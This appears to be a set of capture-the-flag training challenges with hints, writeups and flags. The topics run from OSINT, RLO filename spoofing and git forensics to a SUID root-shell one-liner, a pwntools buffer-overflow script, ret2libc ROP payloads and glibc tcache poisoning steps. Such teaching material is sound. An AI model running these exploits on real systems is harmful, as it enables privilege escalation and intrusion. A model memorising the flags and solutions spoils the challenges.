title: The LGU Social Media Trail
description: An LGU IT officer posted a photo of a new server rack. A monitor in the background shows internal host configuration. Extract the hostname.

hints.text: Zoom and adjust contrast on the background terminal display.

concept: Open-Source Intelligence (OSINT) and visual information leakage
writeup: Sharpening the image reveals the terminal window showing the hostname.

title: Damaged QR Code Restoration
description: A torn QR code from an event poster was scanned. Reconstruct the missing alignment patterns using Reed-Solomon correction to read the flag.

hints.text: QR codes feature up to 30% Reed-Solomon error tolerance.
Use zbarimg or pyzbar to decode directly.

concept: QR code geometry and Reed-Solomon error correction
writeup: Reed-Solomon recovery algorithms allow direct decoding without manual repair.

title: Right-to-Left Override (RLO) Trap
description: A phishing attachment appears as 'Quarterly_Report_2026_gpj.pdf' but executes as a binary. Analyze the Unicode RLO character (U+202E).

hints.text: Unicode character U+202E reverses the visual rendering order of following text.
Inspect the filename in hex: file name contains \xE2\x80\xAE.

concept: Unicode Right-to-Left Override (RLO) file extension spoofing
writeup: Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf.

title: Git Commit Reflog Ghost
description: A developer accidentally committed API credentials to a public git repo, then ran git reset --hard to delete it. Recover the dangling commit.

hints.text: Git objects are not purged immediately; dangling commits remain in the object store.
Run git reflog or git fsck --lost-found to locate unreachable commit hashes.

concept: Git forensics, dangling object recovery, and git reflog analysis
cheatsheet: git reflog ; git fsck --lost-found ; git show <dangling_hash>
writeup: Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag.

title: CyberChef Multi-Stage Recipe
description: An encoded puzzle was found on a hacker forum: Base64 -> Gzip compressed -> Hex encoded -> ROT13 shifted. Build the decoding pipeline.

hints.text: Reverse the operations in order: ROT13 -> From Hex -> Gunzip -> From Base64.
Paste into CyberChef and drag the corresponding operations into the recipe.

concept: Multi-stage deobfuscation and CyberChef recipe chaining
writeup: Chaining the 4 inverse operations in CyberChef unpacks the layered payload.

title: DNS TXT & SPF Record Recon
description: A municipal domain had verification tokens stored in public DNS TXT records during a cloud migration. Enumerate DNS records to recover the flag.

hints.text: Query DNS TXT and SPF records for the domain.
dig txt target.gov.ph or nslookup -type=txt target.gov.ph.

concept: DNS enumeration, TXT records, and OSINT domain reconnaissance
writeup: Querying TXT records exposes verification strings including the flag.

title: Linux SUID & Capability Exploitation
description: You gained unprivileged shell access to an Ubuntu container. Enumerate system binaries with SUID bits or elevated Linux capabilities to spawn an interactive root shell.
hints: Check GTFOBins for binaries like `base64`, `find`, `vim`, or check `getcap -r / 2>/dev/null`.
writeup:
1. Execute `find / -perm -4000 2>/dev/null`.
2. Notice `/usr/bin/find` has SUID permission.
3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \; -quit`.
4. Shell prompt changes to `#` (root).
5. Read `/root/flag.txt`.
6. Flag: `CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}`

title: Classic Stack Buffer Overflow (Ret2Win)
description: A 64-bit ELF executable `vuln` reads 128 bytes into a 32-byte stack buffer using `gets()`. ASLR and stack canaries are disabled, and the binary contains an uncalled function `win()` at address `0x401176`. Overflow the return address to hijack execution.
hints: Calculate padding offset: 32 bytes buffer + 8 bytes saved RBP = 40 bytes.
writeup:
1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.
2. Obtain `win` function address in GDB: `print win` -> `0x401176`.
3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).
4. Exploit script:
   ```python
   from pwn import *
   p = process('./vuln')
   ret = 0x40101a
   win = 0x401176
   payload = b'A'*40 + p64(ret) + p64(win)
   p.sendline(payload)
   print(p.recvall())
   ```
5. Flag: `CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}`

title: Return-Oriented Programming (Ret2Libc)
description: Target server runs with No-Execute (NX/DEP) enabled, preventing shellcode execution on the stack. Leak a libc address (`puts` GOT entry) to calculate libc base, then build a ROP chain to call `system('/bin/sh')`.
hints: Use ROP gadgets like `pop rdi; ret` to pass pointers in 64-bit calling convention.
Stage 1: Leak `puts` GOT address using `puts(puts_got)`. Stage 2: Calculate `libc_base = leaked_puts - puts_offset`. Call `system(binsh)`.
writeup:
1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.
2. Stage 1 payload:
   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.
3. Parse leak and calculate libc base.
4. Stage 2 payload:
   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.
5. Interactive shell opened; cat flag.
6. Flag: `CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}`

title: Glibc 2.35 Tcache Poisoning Heap Exploit
description: An allocation note service allows allocating, editing, and freeing chunks. An off-by-one UAF allows corrupting chunk forward pointers. Bypass Glibc 2.35 safe linking (pointer mangling `L = (P >> 12) ^ Target`) to allocate a chunk over `__environ` and hijack control flow.
hints: In glibc 2.32+, tcache pointers are mangled with random ASLR page offsets: `P' = (P >> 12) ^ P`.
Leak heap base first to demangle pointers, then poison tcache entry to point to return address on stack.
writeup:
1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.
2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.
3. Allocate twice to get an arbitrary write primitive at target.
4. Overwrite return address on stack with one_gadget.
5. Flag: `CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`
